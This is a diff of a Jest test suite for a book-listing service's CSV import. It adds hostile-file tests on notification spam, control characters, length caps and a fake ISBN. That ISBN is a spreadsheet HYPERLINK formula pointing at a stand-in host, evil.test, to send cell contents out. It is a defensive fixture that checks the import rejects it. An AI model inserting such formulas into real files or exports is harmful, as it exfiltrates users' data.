@@ -22,7 +22,7 @@ import { CatalogMatchService } from './catalog-match.service';
 describe('BooksService - import CSV cu rafturi (Goodreads/StoryGraph)', () => {
   let service: BooksService;
   let prisma: {
-    user: { findUnique: jest.Mock };
+    user: { findUnique: jest.Mock; update: jest.Mock };
     userBook: Record<string, jest.Mock>;
     book: Record<string, jest.Mock>;
     bookshelfEntry: Record<string, jest.Mock>;
@@ -32,18 +32,23 @@ describe('BooksService - import CSV cu rafturi (Goodreads/StoryGraph)', () => {
 
   let lookup: Record<string, jest.Mock>;
   let catalogMatch: { findByTitle: jest.Mock };
+  let follow: { notifyFollowersOfNewBook: jest.Mock };
 
   const csv = (body: string) => Buffer.from(body, 'utf-8');
 
   beforeEach(async () => {
     catalogMatch = { findByTitle: jest.fn().mockResolvedValue(null) };
+    follow = { notifyFollowersOfNewBook: jest.fn().mockResolvedValue(undefined) };
     lookup = {
       lookupByIsbn: jest.fn().mockResolvedValue(null),
       lookupPrice: jest.fn().mockResolvedValue(null),
       lookupCoverByTitle: jest.fn().mockResolvedValue(null),
     };
     prisma = {
-      user: { findUnique: jest.fn().mockResolvedValue({ isStore: false }) },
+      user: {
+        findUnique: jest.fn().mockResolvedValue({ isStore: false }),
+        update: jest.fn().mockResolvedValue({}),
+      },
       userBook: {
         findFirst: jest.fn().mockResolvedValue(null),
         findUnique: jest.fn().mockResolvedValue(null),
@@ -76,12 +81,12 @@ describe('BooksService - import CSV cu rafturi (Goodreads/StoryGraph)', () => {
         { provide: PrismaService, useValue: prisma },
         { provide: StorageService, useValue: {} },
         { provide: WishlistService, useValue: { notifyWishlistedUsers: jest.fn().mockResolvedValue(undefined) } },
-        { provide: FollowService, useValue: { notifyFollowersOfNewBook: jest.fn().mockResolvedValue(undefined) } },
+        { provide: FollowService, useValue: follow },
         { provide: ReviewsService, useValue: {} },
         { provide: NotificationsService, useValue: {} },
         { provide: BookLookupService, useValue: lookup },
         { provide: ListingScoreService, useValue: {} },
-        { provide: SavedSearchesService, useValue: {} },
+        { provide: SavedSearchesService, useValue: { notifyOnNewListing: jest.fn().mockResolvedValue(undefined) } },
         { provide: StoresService, useValue: {} },
         { provide: CatalogMatchService, useValue: catalogMatch },
       ],
@@ -223,6 +228,90 @@ describe('BooksService - import CSV cu rafturi (Goodreads/StoryGraph)', () => {
 
     expect(lookup.lookupByIsbn).not.toHaveBeenCalled();
     expect(lookup.lookupCoverByTitle).not.toHaveBeenCalled();
+  });
+
+  describe('fisier ostil', () => {
+    beforeEach(() => {
+      // Anuntul proaspat creat exista, deci syncStockRow trece si randul
+      // ajunge in `created`.
+      prisma.userBook.findUnique.mockResolvedValue({
+        salePrice: null,
+        permanentlyTransferred: false,
+      });
+      prisma.book.findFirst.mockResolvedValue(null);
+    });
+
+    it('nu trimite cate o notificare per rand; XP-ul se acorda o singura data', async () => {
+      const result = await service.importListingsCsv(
+        'user-1',
+        csv('title,author\nDune,Herbert\nSolaris,Lem\nIdiotul,Dostoievski\n'),
+      );
+
+      expect(result.created).toHaveLength(3);
+      // Fara `silent`, fiecare rand anunta followerii si vecinii din oras.
+      expect(follow.notifyFollowersOfNewBook).not.toHaveBeenCalled();
+      expect(prisma.user.update).toHaveBeenCalledTimes(1);
+      expect(prisma.user.update).toHaveBeenCalledWith({
+        where: { id: 'user-1' },
+        data: { xp: { increment: 30 } },
+      });
+    });
+
+    it('un „ISBN" care nu e ISBN (formula Excel) nu ajunge in catalog', async () => {
+      const result = await service.importListingsCsv(
+        'user-1',
+        csv(
+          'title,isbn\n' +
+            'Dune,"=HYPERLINK(""https://evil.test/?""&A1,""x"")"\n' +
+            ',1234567890\n',
+        ),
+      );
+
+      // Randul cu titlu merge mai departe pe titlu, fara ISBN.
+      expect(lookup.lookupByIsbn).not.toHaveBeenCalled();
+      const created = prisma.book.create.mock.calls.map(
+        (c) => c[0].data as Record<string, unknown>,
+      );
+      expect(created).toHaveLength(1);
+      expect(created[0].isbn).toBeUndefined();
+      // 1234567890 are cifra de control gresita, iar randul n-are titlu.
+      expect(result.failed).toEqual([
+        { title: '(fără titlu)', reason: 'ISBN invalid și niciun titlu' },
+      ]);
+    });
+
+    it('taie titlul la plafonul formularului si scoate caracterele de control', async () => {
+      const longTitle = `Dune\u202E${'A'.repeat(5000)}`;
+      await service.importListingsCsv(
+        'user-1',
+        csv(
+          `title,author,description\n"${longTitle}","Her\u0000bert",${'x'.repeat(1000)}\n`,
+        ),
+      );
+
+      const book = prisma.book.create.mock.calls[0][0].data as {
+        title: string;
+        author: string;
+      };
+      expect(book.title).toHaveLength(300);
+      expect(book.title.startsWith('DuneAAA')).toBe(true);
+      expect(book.author).toBe('Herbert');
+      const listing = prisma.userBook.create.mock.calls[0][0].data as {
+        description: string;
+      };
+      expect(listing.description).toHaveLength(256);
+    });
+
+    it('respinge un sku absurd de lung in loc sa-l taie (s-ar ciocni cu altul)', async () => {
+      const result = await service.importListingsCsv(
+        'user-1',
+        csv(`sku,title,qty\n${'S'.repeat(500)},Dune,1\n`),
+      );
+
+      expect(result.failed).toHaveLength(1);
+      expect(result.failed[0].reason).toMatch(/SKU prea lung/);
+      expect(prisma.userBook.create).not.toHaveBeenCalled();
+    });
   });
 
   it('stergerea in masa atinge doar anunturile proprii, nesterse', async () => {
